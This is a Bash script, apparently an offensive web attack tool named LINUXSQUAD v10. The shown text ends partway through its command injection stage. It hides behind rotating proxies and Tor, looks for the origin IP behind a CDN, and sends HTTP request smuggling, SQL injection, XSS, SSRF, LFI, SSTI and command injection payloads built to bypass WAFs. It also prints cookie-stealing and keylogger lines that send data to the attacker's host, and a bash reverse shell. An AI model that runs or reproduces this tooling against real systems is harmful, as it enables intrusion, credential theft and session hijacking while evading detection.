#!/bin/bash
#=========================================================================#
# LINUXSQUAD v10 - AUTOMATIC PROXY ROTATION + SMUGGLING EXPLOIT ENGINE   #
# Stealth | Auto-Proxy | Smuggling | WAF Bypass | Exploitation            #
#=========================================================================#
# I have permission and am authorized to perform this pentest             #
#=========================================================================#

KRM='\033[31;1m'; CYAN='\033[36;1m'; Y='\033[33;1m'; T='\033[32;1m'
BEYAZ='\033[37;1m'; M='\033[34;1m'; MOR='\033[35;1m'; NC='\033[0m'

VULNS=(); HIGH=(); MED=(); TOTAL=0; FOUND=false; START=0
DOMAIN=""; IP=""; REALIP=""; WAF=""; SERVER=""; CMS=""
SESSION=""; CUID=""; RETRY=0; MAX_RETRY=5; BACKOFF=1
TMP="/tmp/linuxsquad_$$"; mkdir -p "$TMP"
PROXY_FILE="$TMP/proxies.txt" ; PROXY_INDEX=0; PROXY_MODE="direct"
SMUGGLE_FOUND=false

#===== BANNER =====#
banner() {
    clear
    echo -e "${KRM}"
    echo '        /\_/\           ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗███████╗'
    echo '       ( o.o )          ██║     ██║████╗  ██║██║   ██║██║ ██╔╝██╔════╝'
    echo '        > ^ <           ██║     ██║██╔██╗ ██║██║   ██║█████╔╝ ███████╗'
    echo '       /   \            ██║     ██║██║╚██╗██║██║   ██║██╔═██╗ ╚════██║'
    echo '      /     \           ███████╗██║██║ ╚████║╚██████╔╝██║  ██╗███████║'
    echo '     /       \          ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝'
    echo -e "${NC}"
    echo -e "${KRM}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BEYAZ}  v10 - AUTO PROXY ROTATION | SMUGGLING EXPLOIT | WAF BYPASS${NC}"
    echo -e "${Y}  Stealth Engine | Smart Proxy Discovery | Multi-Vector Attack${NC}"
    echo -e "${KRM}══════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

#===== HELPERS =====#
UA_LIST=(
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1) AppleWebKit/605.1.15 Mobile/15E148"
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/124.0.6367.83 Mobile"
    "curl/8.7.1" "python-requests/2.31.0" "Go-http-client/2.0"
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
)

rand_ua() { echo "${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"; }
rand_ip() { echo "$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"; }
urlenc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null || echo "$1"; }

#===== AUTO PROXY DISCOVERY + ROTATION =====#
discover_proxies() {
    echo -e "\n${KRM}[PROXY] Automatic Proxy Discovery & Rotation${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    > "$PROXY_FILE"
    
    # Method 1: Tor (best for anonymity)
    if command -v tor &>/dev/null; then
        if ! pgrep -x tor &>/dev/null; then
            sudo service tor start 2>/dev/null || tor --runasdaemon 1 2>/dev/null &
            sleep 2
        fi
        echo -e "  ${Y}[1/4] Tor detected - SOCKS5 127.0.0.1:9050${NC}"
        echo "socks5 127.0.0.1:9050" >> "$PROXY_FILE"
        PROXY_MODE="tor"
    fi
    
    # Method 2: ProxyChains
    if command -v proxychains4 &>/dev/null || command -v proxychains &>/dev/null; then
        echo -e "  ${Y}[2/4] ProxyChains available${NC}"
        [ -f /etc/proxychains4.conf ] && grep -v "^#" /etc/proxychains4.conf | grep -E "socks|http" >> "$PROXY_FILE" 2>/dev/null
        [ -f /etc/proxychains.conf ] && grep -v "^#" /etc/proxychains.conf | grep -E "socks|http" >> "$PROXY_FILE" 2>/dev/null
    fi
    
    # Method 3: Fetch free proxies from internet
    echo -e "  ${Y}[3/4] Fetching free proxies...${NC}"
    
    # Free proxy list API
    curl -s --max-time 5 "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" 2>/dev/null | while read proxy; do
        [ -n "$proxy" ] && echo "http $proxy" >> "$PROXY_FILE"
    done &
    
    curl -s --max-time 5 "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all" 2>/dev/null | while read proxy; do
        [ -n "$proxy" ] && echo "socks4 $proxy" >> "$PROXY_FILE"
    done &
    
    curl -s --max-time 5 "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all" 2>/dev/null | while read proxy; do
        [ -n "$proxy" ] && echo "socks5 $proxy" >> "$PROXY_FILE"
    done &
    
    wait
    sleep 1
    
    # Method 4: Custom proxy file
    if [ -f /tmp/linuxsquad_proxies.txt ]; then
        echo -e "  ${Y}[4/4] Custom proxy list found${NC}"
        cat /tmp/linuxsquad_proxies.txt >> "$PROXY_FILE"
    fi
    
    # Count + verify proxies
    local total=$(sort -u "$PROXY_FILE" 2>/dev/null | wc -l)
    echo -e "  ${T}[+] Total proxies: $total${NC}"
    
    if [ $total -gt 0 ]; then
        PROXY_MODE="auto"
        # Test proxies in background
        ( test_proxies ) &
    fi
}

test_proxies() {
    local valid="$TMP/valid_proxies.txt"
    > "$valid"
    local count=0
    
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local proto=$(echo "$line" | awk '{print $1}')
        local addr=$(echo "$line" | awk '{print $2}')
        
        # Test proxy
        local test=$(curl -s --max-time 3 -x "${proto}://${addr}" "https://icanhazip.com" 2>/dev/null)
        if [ -n "$test" ] && [ "$test" != "$(curl -s ifconfig.me 2>/dev/null)" ]; then
            echo "$proto $addr" >> "$valid"
            ((count++))
        fi
    done < "$PROXY_FILE"
    
    mv "$valid" "$PROXY_FILE" 2>/dev/null
    echo -e "  ${CYAN}[PROXY] $count valid proxies${NC}" >&2
}

get_proxy_flag() {
    if [ ! -f "$PROXY_FILE" ] || [ ! -s "$PROXY_FILE" ]; then
        echo ""
        return
    fi
    
    # Round-robin rotation
    PROXY_INDEX=$(( (PROXY_INDEX + 1) % ($(wc -l < "$PROXY_FILE") + 1) ))
    [ $PROXY_INDEX -eq 0 ] && PROXY_INDEX=1
    
    local line=$(sed -n "${PROXY_INDEX}p" "$PROXY_FILE" 2>/dev/null)
    [ -z "$line" ] && echo "" && return
    
    local proto=$(echo "$line" | awk '{print $1}')
    local addr=$(echo "$line" | awk '{print $2}')
    
    # Periodically rotate Tor circuit
    if [ "$PROXY_MODE" = "tor" ] && [ $((RANDOM % 5)) -eq 0 ]; then
        killall -HUP tor 2>/dev/null
    fi
    
    echo "-x ${proto}://${addr}"
}

#===== SMART DELAY WITH BACKOFF =====#
smart_sleep() {
    local base=${1:-300}
    
    if [ $RETRY -gt 2 ]; then
        BACKOFF=$((BACKOFF * 2))
        [ $BACKOFF -gt 30 ] && BACKOFF=30
        echo -e "  ${Y}[!] Rate limit - backoff ${BACKOFF}s${NC}" >&2
        sleep $BACKOFF
    else
        local jitter=$((RANDOM % base))
        local delay=$((base + jitter))
        local sec=$(echo "scale=3; $delay / 1000" | bc 2>/dev/null || echo "0.3")
        sleep "$sec" 2>/dev/null || sleep 0.3
    fi
}

#===== WAF REQUEST ENGINE WITH PROXY + STEALTH =====#
waf_req() {
    local url="$1"; local method="${2:-GET}"; local data="${3:-}"
    local ua=$(rand_ua); local xff=$(rand_ip)
    local proxy=$(get_proxy_flag)
    local host_h=""
    [ -n "$REALIP" ] && host_h="-H 'Host: $DOMAIN'"
    
    local headers=(
        -H "User-Agent: $ua"
        -H "X-Forwarded-For: $xff"
        -H "X-Real-IP: $xff"
        -H "X-Originating-IP: $xff"
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        -H "Accept-Language: en-US,en;q=0.9,az;q=0.8,tr;q=0.7"
        -H "Accept-Encoding: gzip, deflate, br"
        -H "Cache-Control: no-cache"
        -H "Pragma: no-cache"
        -H "DNT: 1"
        -H "Connection: keep-alive"
        -H "Upgrade-Insecure-Requests: 1"
        -H "Sec-Fetch-Dest: document"
        -H "Sec-Fetch-Mode: navigate"
        -H "Sec-Fetch-Site: none"
        -H "Sec-Fetch-User: ?1"
    )
    
    [ -n "$SESSION" ] && headers+=(-H "Cookie: $SESSION")
    [ -n "$CUID" ] && headers+=(-H "X-Request-ID: $CUID")
    
    local retry=0
    while [ $retry -lt $MAX_RETRY ]; do
        smart_sleep
        
        local resp=$(curl -s --max-time 8 -k $proxy "${headers[@]}" $(echo $host_h) \
            $( [ "$method" = "POST" ] && echo "-X POST -d '$data'" ) "$url" 2>/dev/null)
        
        if echo "$resp" | grep -qi "429\|rate limit\|too many\|try again\|blocked\|access denied\|403\|503"; then
            ((retry++)); ((RETRY++))
            # Rotate proxy on rate limit
            proxy=$(get_proxy_flag)
            continue
        fi
        
        RETRY=0; BACKOFF=1
        echo "$resp"
        return
    done
    
    echo "$resp"
}

waf_req_head() {
    local url="$1"; local ua=$(rand_ua); local xff=$(rand_ip)
    local proxy=$(get_proxy_flag)
    
    curl -sI --max-time 5 -k $proxy \
        -H "User-Agent: $ua" \
        -H "X-Forwarded-For: $xff" \
        -H "X-Real-IP: $xff" \
        -H "X-Originating-IP: $xff" \
        -H "Accept: text/html,*/*" \
        -H "DNT: 1" \
        -H "Connection: close" \
        "$url" 2>/dev/null
}

#===== HTTP SMUGGLING EXPLOIT ENGINE =====#
smuggling_exploit() {
    echo -e "\n${KRM}[SMUGGLE] HTTP Request Smuggling Exploitation${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local host="$DOMAIN"
    
    # CL.TE Probe - detect smuggling
    echo -e "${CYAN}[Smuggling] CL.TE Probe...${NC}"
    local result=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
        echo -e 'POST / HTTP/1.1\r\nHost: $host\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nSMUGGLED' >&3;
        cat <&3 2>/dev/null" 2>/dev/null)
    ((TOTAL+=2))
    
    if echo "$result" | grep -qi "SMUGGLED\|unrecognized\|HTTP/1.1 200\|smuggling\|desync"; then
        echo -e "  ${KRM}[SMUGGLE CL.TE] VULNERABLE!${NC}"
        SMUGGLE_FOUND=true
        HIGH+=("CRITICAL:HTTP-Smuggling-CL.TE:$host")
        FOUND=true
    fi
    
    # TE.CL Probe
    echo -e "${CYAN}[Smuggling] TE.CL Probe...${NC}"
    local result2=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
        echo -e 'POST / HTTP/1.1\r\nHost: $host\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n5c\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nHost: $host\r\nX-Ignore: X' >&3;
        cat <&3 2>/dev/null" 2>/dev/null)
    ((TOTAL+=2))
    
    if echo "$result2" | grep -qi "HTTP/1.1 404\|Not Found\|unrecognized\|SMUGGLED"; then
        echo -e "  ${KRM}[SMUGGLE TE.CL] VULNERABLE!${NC}"
        SMUGGLE_FOUND=true
        HIGH+=("CRITICAL:HTTP-Smuggling-TE.CL:$host")
        FOUND=true
    fi
    
    # === SMUGGLING EXPLOITATION ===
    if [ "$SMUGGLE_FOUND" = true ]; then
        echo -e "\n${CYAN}[Smuggling] Exploiting...${NC}"
        
        # Exploit 1: WAF Bypass via smuggling
        echo -e "  ${Y}[1/3] WAF Bypass via Smuggling...${NC}"
        local smuggle_sqli=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
            echo -e 'POST / HTTP/1.1\r\nHost: $host\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /?id=1'"'"' OR 1=1-- HTTP/1.1\r\nHost: $host\r\nX-Ignore: X' >&3;
            cat <&3 2>/dev/null" 2>/dev/null)
        ((TOTAL+=2))
        
        if echo "$smuggle_sqli" | grep -qi "sql\|syntax\|error\|mysql\|unknown\|1=1\|1.*2.*3"; then
            echo -e "    ${KRM}[SMUGGLE SQLi] WAF Bypass successful!${NC}"
            HIGH+=("CRITICAL:Smuggling-WAF-Bypass-SQLi")
        fi
        
        # Exploit 2: Internal redirect
        echo -e "  ${Y}[2/3] Internal Endpoint Access...${NC}"
        local smuggle_admin=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
            echo -e 'POST / HTTP/1.1\r\nHost: $host\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal-admin\r\nX-Ignore: X' >&3;
            cat <&3 2>/dev/null" 2>/dev/null)
        ((TOTAL+=2))
        
        if echo "$smuggle_admin" | grep -qi "admin\|dashboard\|panel\|login\|200 OK"; then
            echo -e "    ${KRM}[SMUGGLE INTERNAL] Admin panel accessible!${NC}"
            HIGH+=("CRITICAL:Smuggling-Internal-Admin-Access")
        fi
        
        # Exploit 3: Session hijacking via smuggling
        echo -e "  ${Y}[3/3] Session Stealing...${NC}"
        local smuggle_session=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
            echo -e 'POST / HTTP/1.1\r\nHost: $host\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: $host\r\nCookie: session=smuggled_attack' >&3;
            cat <&3 2>/dev/null" 2>/dev/null)
        ((TOTAL+=2))
        
        # Try to inject payload through smuggled request
        local smuggle_payload=$(timeout 5 bash -c "exec 3<>/dev/tcp/$host/443;
            echo -e 'GET /?page=../../../etc/passwd HTTP/1.1\r\nHost: $host\r\nConnection: keep-alive\r\n\r\nGET /?page=../../../etc/passwd HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n' >&3;
            cat <&3 2>/dev/null" 2>/dev/null)
        ((TOTAL+=2))
        
        if echo "$smuggle_payload" | grep -qi "root:.*:0:0\|nobody"; then
            echo -e "    ${KRM}[SMUGGLE LFI] File inclusion via smuggling!${NC}"
            HIGH+=("CRITICAL:Smuggling-LFI-Exploit")
        fi
        
        echo -e "  ${T}[+] Smuggling exploitation complete${NC}"
    else
        echo -e "  ${CYAN}[*] No smuggling vulnerability detected${NC}"
    fi
}

#===== ORIGIN IP BYPASS =====#
phase0_origin() {
    echo -e "\n${KRM}[0] ORIGIN IP DISCOVERY${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local ipfile="$TMP/ips.txt"; > "$ipfile"
    
    # 1. DNS history
    waf_req "https://api.viewdns.info/iphistory/?domain=$DOMAIN&apikey=viewdns&output=json" 2>/dev/null | grep -oP '"ip":"[^"]*"' | sed 's/"ip":"//;s/"//' >> "$ipfile"
    
    # 2. MX/TXT records
    dig MX "$DOMAIN" +short 2>/dev/null | awk '{print $NF}' | while read mx; do dig +short "$mx" 2>/dev/null >> "$ipfile"; done
    dig TXT "$DOMAIN" +short 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' >> "$ipfile"
    
    # 3. SSL certificate
    echo | openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null | openssl x509 -text -noout 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' >> "$ipfile"
    
    # 4. Subdomains (parallel)
    for sub in www mail ftp admin cpanel webmail blog api dev test vpn remote support cdn m static img mail2 mx1 ns1 git ci jira jenkins confluence wiki docs status monitoring cloud app portal secure login sso oauth; do
        (dig +short "$sub.$DOMAIN" 2>/dev/null >> "$ipfile") &
    done
    wait
    
    # 5. Verify
    local cf_ips=$(waf_req "https://www.cloudflare.com/ips-v4" 2>/dev/null)
    
    sort -u "$ipfile" 2>/dev/null | while read ip; do
        [[ "$ip" =~ ^(127|10|172\.1[6-9]|172\.2[0-9]|172\.3[01]|192\.168)\. ]] && continue
        echo "$cf_ips" | grep -q "$ip" && continue
        
        local test=$(waf_req_head --resolve "$DOMAIN:443:$ip" "https://$DOMAIN/" 2>/dev/null)
        if [ -n "$test" ] && ! echo "$test" | grep -qi "cloudflare\|cf-ray\|blocked\|access denied\|403\|429"; then
            echo -e "  ${KRM}[ORIGIN] $ip${NC}"
            REALIP="$ip"
            HIGH+=("CRITICAL:Origin-IP-Bypass:$ip")
            FOUND=true
            break
        fi
    done
    
    # 6. Cloudflare bypass
    local cf_test=$(waf_req "https://$DOMAIN.cdn.cloudflare.net/" 2>/dev/null)
    if [ -n "$cf_test" ] && ! echo "$cf_test" | grep -qi "cloudflare\|blocked"; then
        echo -e "  ${KRM}[CF BYPASS] cdn.cloudflare.net${NC}"
        HIGH+=("MEDIUM:Cloudflare-cdn-bypass")
    fi
    
    [ -z "$REALIP" ] && echo -e "  ${Y}[*] Origin not found${NC}"
}

#===== RECON =====#
phase1_recon() {
    echo -e "\n${KRM}[1] RECONNAISSANCE${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local HDRS=$(waf_req_head "https://$DOMAIN/" 2>/dev/null)
    
    SERVER=$(echo "$HDRS" | grep -i "Server:" | head -1 | sed 's/Server: //i')
    [ -z "$SERVER" ] && SERVER="Hidden"
    
    local ww=$(whatweb -a 3 "https://$DOMAIN" --color=never 2>/dev/null)
    CMS=$(echo "$ww" | grep -oiP "WordPress|Joomla|Drupal|Laravel|Django|Flask|Express|Next\.?js|React|Vue|Angular|Shopify|Magento" | head -1)
    [ -z "$CMS" ] && CMS=$(echo "$ww" | grep -oiP "CMS\[.*?\]" | head -1 | tr -d '[]')
    [ -z "$CMS" ] && CMS="Unknown"
    
    echo -e "  ${BEYAZ}Server: ${Y}$SERVER${NC}"
    echo -e "  ${BEYAZ}CMS: ${Y}$CMS${NC}"
    echo -e "  ${BEYAZ}IP: ${Y}$IP${NC}"
    
    # WAF detection
    echo "$HDRS" | grep -qi "cloudflare\|cf-ray\|__cfduid\|cf-cache-status" && WAF="Cloudflare" && echo -e "  ${Y}[WAF] Cloudflare${NC}"
    echo "$HDRS" | grep -qi "mod_security\|ModSecurity\|OWASP_CRS" && WAF="ModSecurity" && echo -e "  ${Y}[WAF] ModSecurity${NC}"
    echo "$HDRS" | grep -qi "x-amz-cf\|x-amzn-RequestId\|cloudfront" && WAF="AWS WAF" && echo -e "  ${Y}[WAF] AWS WAF${NC}"
    echo "$HDRS" | grep -qi "incapsula\|Imperva\|X-Iinfo" && WAF="Imperva" && echo -e "  ${Y}[WAF] Imperva${NC}"
    echo "$HDRS" | grep -qi "bigip\|BIG-IP\|X-F5" && WAF="F5 BIG-IP" && echo -e "  ${Y}[WAF] F5 BIG-IP${NC}"
    echo "$HDRS" | grep -qi "akamai\|Akamai\|X-Akamai" && WAF="Akamai" && echo -e "  ${Y}[WAF] Akamai${NC}"
    [ -z "$WAF" ] && WAF="None" && echo -e "  ${CYAN}[*] No WAF${NC}"
    
    # Session
    local resp=$(waf_req "https://$DOMAIN/" 2>/dev/null)
    SESSION=$(echo "$resp" | grep -oiP 'Set-Cookie: [^;]+' | sed 's/Set-Cookie: //' | head -1)
    CUID=$(echo "$resp" | grep -oiP 'csrf[^=]*=[^"'"'"'\s]+' | head -1)
    echo -e "  ${CYAN}[*] Session: ${SESSION:-none} | CSRF: ${CUID:-none}${NC}"
    
    # Parallel endpoint discovery
    echo -e "${CYAN}[*] Endpoint scan (parallel)...${NC}"
    for ep in /admin /login /wp-admin /administrator /.git/config /.env /robots.txt /sitemap.xml /api/v1 /api/v2 /graphql /swagger-ui /actuator/health /phpinfo.php /debug /backup /config /db /sql /test /status /healthcheck /manage /portal /signin /register /forgot /reset /oauth /callback /webhook /hook /api-docs /swagger-resources /v1 /v2 /v3 /internal /private /secret /hidden /.well-known/security.txt /.htaccess /crossdomain.xml /clientaccesspolicy.xml /Dockerfile /package.json /composer.json /web.config /wp-content /wp-includes /wp-json /wp-admin/admin-ajax.php /xmlrpc.php /server-status /server-info /cgi-bin/ /cpanel /webmail /mail; do
        (local code=$(waf_req_head "https://$DOMAIN$ep" 2>/dev/null | head -1 | awk '{print $2}')
        [ -n "$code" ] && [ "$code" != "404" ] && [ "$code" != "301" ] && [ "$code" != "302" ] && [ "$code" != "400" ] && echo -e "  ${Y}[$code] $ep${NC}") &
    done
    wait
    
    echo -e "${T}[+] Recon complete${NC}"
}

#===== SQLi WAF BYPASS =====#
phase2_sqli() {
    echo -e "\n${KRM}[2] SQLi WAF BYPASS${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local host="$DOMAIN"
    [ -n "$REALIP" ] && host="$REALIP" && echo -e "  ${KRM}[!] Origin IP: $host${NC}"
    
    # JSON SQLi (Team82)
    echo -e "${CYAN}[2.1] JSON SQLi (Team82 bypass)...${NC}"
    for param in id page cat q s search name email product post news user cid bid pid; do
        for payload in "'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb--" "' OR JSON_LENGTH('{}')=0--"; do
            local enc=$(urlenc "$payload")
            local resp=$(waf_req "https://$host/?${param}=1${enc}" 2>/dev/null | tr '[:upper:]' '[:lower:]')
            ((TOTAL++))
            
            if echo "$resp" | grep -qi "sql\|syntax\|error\|mysql\|postgresql\|ora-[0-9]\|unclosed\|incorrect syntax\|unknown column\|invalid query\|mariadb\|sqlite\|driver\|You have an error"; then
                echo -e "  ${KRM}[SQLi JSON] /?${param}=1${payload:0:40}...${NC}"
                HIGH+=("CRITICAL:SQLi-JSON-WAF-Bypass:/?${param}=...")
                FOUND=true
                
                # Auto exploit with sqlmap
                command -v sqlmap &>/dev/null && {
                    echo -e "\n${CYAN}[2.2] Auto sqlmap exploitation...${NC}"
                    local out=$(sqlmap -u "https://$host/?${param}=1" --batch --level=5 --risk=3 --random-agent \
                        --tamper=space2comment,randomcase,between,unionalltounion,charencode,charunicodeencode,equaltolike \
                        --headers="X-Forwarded-For: $(rand_ip)" --delay=1 \
                        --output-dir="$TMP/sqlmap" 2>&1 | grep -i "vulnerable\|injectable\|payload\|TYPE:\|dbs\|Table:" | head -5)
                    ((TOTAL+=20))
                    echo -e "  ${KRM}$out${NC}"
                }
                return
            fi
        done
    done
    
    # UNION bypass
    echo -e "${CYAN}[2.2] UNION SQLi bypass...${NC}"
    for param in id page cat q s; do
        for payload in "1' UN/**/ION SE/**/LECT 1,2,3,4,5--" "1' /*!12345UNION*/ SELECT 1,2,3,4,5--" "1' UNION%0aSELECT%0a1,2,3,4,5--" "1%2527%2520UNION%2520SELECT%25201,2,3,4,5--"; do
            local enc=$(urlenc "$payload")
            local resp=$(waf_req "https://$host/?${param}=${enc}" 2>/dev/null | tr '[:upper:]' '[:lower:]')
            ((TOTAL++))
            
            if echo "$resp" | grep -qi "1[^0-9]*2[^0-9]*3[^0-9]*4[^0-9]*5\|column.*1.*2\|error\|syntax\|sql\|unknown"; then
                echo -e "  ${KRM}[SQLi UNION] /?${param}=${payload:0:40}...${NC}"
                HIGH+=("CRITICAL:SQLi-UNION-WAF-Bypass:/?${param}=...")
                FOUND=true; return
            fi
        done
    done
    
    # Time-based
    echo -e "${CYAN}[2.3] Time-based blind...${NC}"
    for param in id page cat; do
        for payload in "' AND SLEEP(3)--" "1' OR SLEEP(3)--" "1' OR pg_sleep(3)--" "1' WAITFOR DELAY '0:0:3'--" "1' AND BENCHMARK(5000000,MD5(1))--"; do
            local enc=$(urlenc "$payload")
            local ts=$(date +%s%N 2>/dev/null || echo 0)
            waf_req "https://$host/?${param}=${enc}" 2>/dev/null > /dev/null
            local te=$(date +%s%N 2>/dev/null || echo 0); local diff=0
            [[ "$ts" =~ ^[0-9]+$ ]] && [[ "$te" =~ ^[0-9]+$ ]] && diff=$(( (te - ts) / 1000000000 ))
            ((TOTAL++))
            
            if [ $diff -ge 2 ]; then
                echo -e "  ${KRM}[SQLi TIME] /?${param}=${payload:0:30}... (${diff}s)${NC}"
                HIGH+=("CRITICAL:SQLi-Time-Based-Bypass")
                FOUND=true; return
            fi
        done
    done
    
    echo -e "  ${CYAN}[*] SQLi not found${NC}"
}

#===== XSS WAF BYPASS =====#
phase3_xss() {
    echo -e "\n${KRM}[3] XSS WAF BYPASS${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local host="$DOMAIN"
    [ -n "$REALIP" ] && host="$REALIP"
    
    echo -e "${CYAN}[3.1] Fragment XSS bypass...${NC}"
    local FRAGS=(
        "jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/"
        "window['al'%2B'ert'](1)"
        "'-alert(1)-'"
        "'--%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
        "%3Csvg/onload=alert(1)%3E"
        "%3Cbody%20onload=alert(1)%3E"
        "%3Cinput%20autofocus%20onfocus=alert(1)%3E"
        "%3Cdetails%20open%20ontoggle=alert(1)%3E"
        "%3Cimg%20src=x%20onpointerrawupdate=alert(1)%3E"
        "%3Cimg%20src=x%20onbeforetoggle=alert(1)%3E"
        "%3Cimg%20src=x%20onauxclick=alert(1)%3E"
        "%3Cimg%20src=x%20onscrollend=alert(1)%3E"
    )
    
    for param in q s search query keyword name email message comment text url redirect return id page; do
        for frag in "${FRAGS[@]}"; do
            local resp=$(waf_req "https://$host/?${param}=${frag}" 2>/dev/null)
            ((TOTAL++))
            
            if echo "$resp" | grep -qi "alert(1)\|alert\`1\`\|prompt(1)\|confirm(1)\|javascript:alert\|onerror=alert\|onload=alert\|onfocus=alert\|onpointerrawupdate=alert"; then
                echo -e "  ${KRM}[XSS] /?${param}=${frag:0:40}...${NC}"
                HIGH+=("CRITICAL:XSS-WAF-Bypass:/?${param}=...")
                FOUND=true
                
                echo -e "\n${CYAN}[3.2] XSS Exploitation:${NC}"
                local atk_ip=$(hostname -I | awk '{print $1}')
                echo -e "  ${Y}Cookie: <script>document.location='http://${atk_ip}:8080/?c='+document.cookie</script>${NC}"
                echo -e "  ${Y}Keylog: <script>document.onkeypress=function(e){fetch('http://${atk_ip}:8080/?k='+e.key)}</script>${NC}"
                echo -e "  ${Y}BeEF:   <script src='http://${atk_ip}:3000/hook.js'></script>${NC}"
                return
            fi
        done
    done
    
    echo -e "  ${CYAN}[*] XSS not found${NC}"
}

#===== ADVANCED WAF BYPASS =====#
phase4_advanced() {
    echo -e "\n${KRM}[4] ADVANCED WAF BYPASS${NC}"
    echo -e "${M}────────────────────────────────────────────────────────${NC}"
    
    local host="$DOMAIN"
    [ -n "$REALIP" ] && host="$REALIP"
    
    # SSRF
    echo -e "${CYAN}[4.1] SSRF bypass...${NC}"
    for param in url link redirect file src img image; do
        local resp=$(waf_req "https://$host/?${param}=http://0x7f000001:22/" 2>/dev/null)
        ((TOTAL++))
        echo "$resp" | grep -qi "ssh\|OpenSSH\|SSH-\|protocol\|fingerprint" && {
            echo -e "  ${KRM}[SSRF] /?${param}=0x7f000001:22${NC}"
            HIGH+=("CRITICAL:SSRF-DNS-Rebinding"); FOUND=true
        }
        
        local mresp=$(waf_req "https://$host/?${param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
        ((TOTAL++))
        echo "$mresp" | grep -qi "ami-id\|instance-id\|secretaccesskey\|aws_secret\|aws_access" && {
            echo -e "  ${KRM}[SSRF AWS] IAM credentials!${NC}"
            HIGH+=("CRITICAL:SSRF-AWS-IAM-Credentials"); FOUND=true
        }
    done
    
    # LFI
    echo -e "${CYAN}[4.2] LFI PHP wrapper...${NC}"
    for param in file page path include require template view load; do
        local resp=$(waf_req "https://$host/?${param}=php://filter/convert.base64-encode/resource=config.php" 2>/dev/null)
        ((TOTAL++))
        echo "$resp" | grep -qi "PD9waHA\|base64\|database\|DB_\|password\|username\|host\|port\|define\|secret\|api_key" && {
            echo -e "  ${KRM}[LFI PHP] Config leaked!${NC}"
            HIGH+=("CRITICAL:LFI-PHP-Config-Leak"); FOUND=true
        }
    done
    
    # SSTI
    echo -e "${CYAN}[4.3] SSTI...${NC}"
    for param in name user search q; do
        for p in "{{7*7}}" "#{7*7}" '${7*7}' "<%=7*7%>" "{{7*'7'}}"; do
            local enc=$(urlenc "$p")
            local resp=$(waf_req "https://$host/?${param}=${enc}" 2>/dev/null)
            ((TOTAL++))
            echo "$resp" | grep -q "49\|77" && {
                echo -e "  ${KRM}[SSTI] /?${param}=${p}${NC}"
                HIGH+=("CRITICAL:SSTI:/?${param}=${p}"); FOUND=true
            }
        done
    done
    
    # Command Injection
    echo -e "${CYAN}[4.4] Command Injection...${NC}"
    for param in cmd exec command ping traceroute host whois nslookup; do
        for p in ";id" "|id" "`id`" "$(id)"; do
            local enc=$(urlenc "$p")
            local resp=$(waf_req "https://$host/?${param}=1${enc}" 2>/dev/null)
            ((TOTAL++))
            echo "$resp" | grep -qi "uid=\|gid=\|groups=\|root\|bin\|daemon\|nobody" && {
                local atk_ip=$(hostname -I | awk '{print $1}')
                echo -e "  ${KRM}[CMDi] /?${param}=1${p}${NC}"
                echo -e "  ${Y}Reverse shell: bash -c 'bash -i >& /dev/tcp/${atk_ip}/4444 0>&1'${NC}"
